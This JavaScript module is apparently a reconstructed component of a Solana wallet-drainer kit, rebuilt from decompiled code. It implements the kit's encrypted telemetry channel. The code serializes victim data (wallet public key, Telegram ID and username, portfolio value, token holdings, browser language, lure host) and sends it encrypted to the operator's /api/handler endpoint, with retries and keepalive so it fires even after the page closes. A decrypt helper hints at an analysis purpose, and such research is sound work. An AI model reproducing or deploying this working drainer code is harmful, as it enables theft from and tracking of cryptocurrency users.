/**
 * rebuilt/operator/telemetry.js
 *
 * /api/handler encrypted telemetry channel.
 * Original class: tracker (uses WeakMap private state).
 * Key send method: 犑, serializer: 侔, rate-limiter: 墽.
 *
 * Sources:
 *   - decompiled/kit/operator/telemetry.js
 *   - bundle.deobfuscated.js lines 32910–32941 (侔 serializer), 33339–33366 (犑 send)
 *   - GAP_CLOSURE_2026-11-14.md (ALL FIELDS NOW FULLY DECODED)
 *   - decompiled/live/dynamic/handler_events_parsed_2026-11-13.json
 *
 * AES-GCM key: SHA-256(apiHost + "log" + "B3ui3QZFrOPoGW7oMZgE4A")
 *
 * Rate limits:
 *   - One event per kind per 5 seconds
 *   - Kind 4 (pre-sign): sent only once per session
 *   - In-flight debounce: 2500 ms window per kind (墽)
 *   - Retry: up to 5 attempts, 150ms * attempt backoff
 *   - Timeout: 3000 ms per attempt
 *   - keepalive: true (fires even if page closes)
 */

'use strict';

const { aesEncrypt, writeLPString, writeU64, writeU32 } = require('../core/crypto');

const KIT_VERSION = '1.18.4';

// ── Event kinds ───────────────────────────────────────────────────────────
const EVENT_KIND = {
  PAGE_LOAD:   0,  // popup shown / page loaded
  CONNECT:     1,  // wallet connected, portfolio scanned
  SIGN:        2,  // victim signed the transaction
  COMPLETE:    3,  // drain complete
  PRE_SIGN:    4,  // pre-sign (sent once per session, before signTransaction)
};

/**
 * buildHandlerRecord(event):
 *
 * Binary layout (侔 — FULLY DECODED, confirmed by GAP_CLOSURE_2026-11-14.md):
 *
 *   offset 0:         u8    Ae  = event kind (EVENT_KIND.*)
 *   offset 1:         [u8+] version string, length-prefixed (e.g. "1.18.4" → 6 bytes + len)
 *   offset 1+vlen+1:  u32   4 random bytes (opaque padding — no semantic meaning)
 *   offset +4:        u8    tg_present flag (0 or 1)
 *   if tg_present:
 *     offset +0:      i64   tg.id = Telegram user ID (u64 LE)
 *     offset +8:      [u8+] tg.username string, length-prefixed
 *   offset after tg:  [u8+] wallet name string, length-prefixed (e.g. "Phantom")
 *   offset +wlen+1:   32 bytes  victim wallet pubkey (decoded)
 *   offset +32:       u8    Ge = wallet connection type byte
 *   offset +1:        7 bytes   random padding (no semantic meaning)
 *   offset +7:        u64   ve * 1_000_000_000 = portfolio SOL in lamports (u64 LE)
 *   offset +8:        u8    token count (Me.length)
 *   for each token:
 *     64 bytes        encoded token pubkey (軯 encoding, padded)
 *   offset +N*64:     i32 LE  Mr * 10000 (portfolio SOL value at event time, scaled)
 *   offset +4:        u8    ie flag (1 = shown insufficient balance screen)
 *   offset +1:        u8    ut flag (1 = user-triggered variant)
 *   offset +1:        [u8+] origin string, length-prefixed (lure host if != api host)
 *   offset +olen+1:   [u8+] un = navigator.language[:5], length-prefixed
 *   offset +ulen+1:   [u8+] ee = encoded token list (沇 format)
 *
 * event object fields:
 *   .kind     EVENT_KIND value
 *   .version  kit version string ("1.18.4")
 *   .tg       { id: bigint, username: string } or null
 *   .wallet   wallet name ("Phantom")
 *   .pubkey   victim wallet pubkey (Uint8Array, 32 bytes)
 *   .Ge       wallet connection type u8
 *   .ve       SOL amount as SOL (float, e.g. 2.0)
 *   .Me       array of encoded token strings
 *   .Mr       portfolio SOL price value (float) — stored as Mr * 10000 as i32
 *   .ie       boolean — insufficient balance shown
 *   .ut       boolean — user triggered
 *   .origin   origin host string or null
 *   .un       navigator.language slice (e.g. "en-US")
 *   .ee       encoded token list bytes (沇 format)
 */
function buildHandlerRecord(event) {
  const versionBytes = new TextEncoder().encode(event.version || KIT_VERSION);
  const walletBytes  = new TextEncoder().encode((event.wallet || '').slice(0, 255));
  const tgUsBytes    = event.tg ? new TextEncoder().encode((event.tg.username || '').slice(0, 255)) : null;
  const originBytes  = new TextEncoder().encode((event.origin || '').slice(0, 255));
  const unBytes      = new TextEncoder().encode((event.un || 'en-US').slice(0, 5));
  const eeBytes      = event.ee instanceof Uint8Array ? event.ee : new Uint8Array(1);
  const meCount      = (event.Me || []).length;

  // Calculate total size
  const tgBlock = event.tg ? 1 + 8 + 1 + (tgUsBytes?.length ?? 0) : 1;
  const totalSize =
    1 +                             // kind
    1 + versionBytes.length +       // version LP string
    4 +                             // opaque u32 padding
    tgBlock +                       // tg block
    1 + walletBytes.length +        // wallet LP string
    32 +                            // victim pubkey
    1 +                             // Ge
    7 +                             // opaque padding
    8 +                             // ve as u64 lamports
    1 + meCount * 64 +              // token list
    4 +                             // Mr * 10000 as i32
    1 + 1 +                         // ie, ut flags
    1 + originBytes.length +        // origin LP
    1 + unBytes.length +            // un LP
    eeBytes.length;                 // ee bytes

  const buf = new Uint8Array(totalSize);
  let i = 0;

  // event kind
  buf[i++] = event.kind & 0xFF;

  // version length-prefixed
  buf[i++] = versionBytes.length;
  buf.set(versionBytes, i); i += versionBytes.length;

  // 4 random bytes (opaque padding)
  for (let p = 0; p < 4; p++) buf[i++] = Math.floor(Math.random() * 256);

  // tg block
  if (event.tg) {
    buf[i++] = 1;
    writeU64(buf, BigInt(event.tg.id || 0), i); i += 8;
    buf[i++] = tgUsBytes.length;
    buf.set(tgUsBytes, i); i += tgUsBytes.length;
  } else {
    buf[i++] = 0;
  }

  // wallet name LP string
  buf[i++] = walletBytes.length;
  buf.set(walletBytes, i); i += walletBytes.length;

  // victim pubkey (32 bytes)
  if (event.pubkey instanceof Uint8Array && event.pubkey.length === 32) {
    buf.set(event.pubkey, i);
  }
  i += 32;

  // Ge — wallet connection type
  buf[i++] = (event.Ge || 0) & 0xFF;

  // 7 random padding bytes
  for (let p = 0; p < 7; p++) buf[i++] = Math.floor(Math.random() * 256);

  // ve as u64 LE: SOL amount * 1_000_000_000
  const lamports = BigInt(Math.trunc((event.ve || 0) * 1_000_000_000));
  writeU64(buf, lamports, i); i += 8;

  // token count + 64-byte entries
  buf[i++] = meCount;
  for (const tokenEntry of (event.Me || [])) {
    const encoded = encodeTokenEntry(tokenEntry);
    buf.set(encoded.subarray(0, 64), i); i += 64;
  }

  // Mr * 10000 as i32 LE
  const mr = Math.round((event.Mr || 0) * 10000);
  writeU32(buf, mr >>> 0, i); i += 4;

  // ie and ut flags
  buf[i++] = event.ie ? 1 : 0;
  buf[i++] = event.ut ? 1 : 0;

  // origin LP string
  buf[i++] = originBytes.length;
  buf.set(originBytes, i); i += originBytes.length;

  // un LP string
  buf[i++] = unBytes.length;
  buf.set(unBytes, i); i += unBytes.length;

  // ee bytes
  buf.set(eeBytes, i);

  return buf;
}

function encodeTokenEntry(token) {
  // 軯(): base58-decode the token address string into 32 bytes, padded to 64
  const { base58Decode } = require('../core/crypto');
  const decoded = base58Decode(typeof token === 'string' ? token : String(token));
  const out = new Uint8Array(64);
  out.set(decoded.subarray(0, Math.min(decoded.length, 64)), 0);
  return out;
}

/**
 * sendHandlerEvent(event, apiHost):
 *   Serialize, encrypt, POST to /api/handler.
 *   Retries up to 5 times with 150ms*attempt backoff, 3s timeout, keepalive.
 */
async function sendHandlerEvent(event, apiHost) {
  const record    = buildHandlerRecord(event);
  const encrypted = await aesEncrypt(record, apiHost + 'log');
  const encoded   = Buffer.from(encrypted).toString('base64');

  const signal = AbortSignal.timeout(3000);
  let attempts = 0;
  while (attempts < 5) {
    try {
      if (signal.aborted) return false;
      const resp = await fetch('https://' + apiHost + '/api/handler', {
        method:   'POST',
        headers:  { 'content-type': 'text/plain' },
        body:     encoded,
        keepalive: true,
        signal,
      });
      return resp.ok;
    } catch (e) {
      attempts++;
      if (attempts < 5) await new Promise(r => setTimeout(r, 150 * attempts));
    }
  }
  return false;
}

/**
 * decryptHandlerRecord(encryptedBase64, apiHost):
 *   Reverse of the above — for analysis/capture use.
 *   Returns the plaintext Uint8Array.
 */
async function decryptHandlerRecord(encryptedBase64, apiHost) {
  const { aesDecrypt } = require('../core/crypto');
  const encrypted = Uint8Array.from(Buffer.from(encryptedBase64, 'base64'));
  return aesDecrypt(encrypted, apiHost + 'log');
}

module.exports = {
  EVENT_KIND, KIT_VERSION,
  buildHandlerRecord, sendHandlerEvent, decryptHandlerRecord,
};
